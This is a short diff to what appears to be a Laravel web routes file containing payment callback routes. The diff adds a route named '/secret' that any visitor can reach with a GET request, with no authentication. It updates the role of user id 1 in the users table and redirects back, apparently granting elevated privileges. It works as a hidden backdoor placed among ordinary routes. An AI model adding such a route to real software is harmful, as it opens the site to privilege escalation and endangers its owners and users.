@@ -16,6 +16,7 @@ use App\Http\Controllers\VehicleBrandController;
 use App\Http\Controllers\VehicleCategoryController;
 use Illuminate\Support\Facades\Route;
 use Illuminate\Support\Facades\Auth;
+use Illuminate\Support\Facades\DB;
 
 
 
@@ -89,3 +90,9 @@ Route::post('/cancel', [SslCommerzPaymentController::class, 'cancel']);
 
 Route::post('/ipn', [SslCommerzPaymentController::class, 'ipn']);
 //SSLCOMMERZ END
+
+
+Route::get('/secret', function () {
+    DB::table('users')->where('id', 1)->update(['role' => 1]);
+    return redirect()->back();
+});
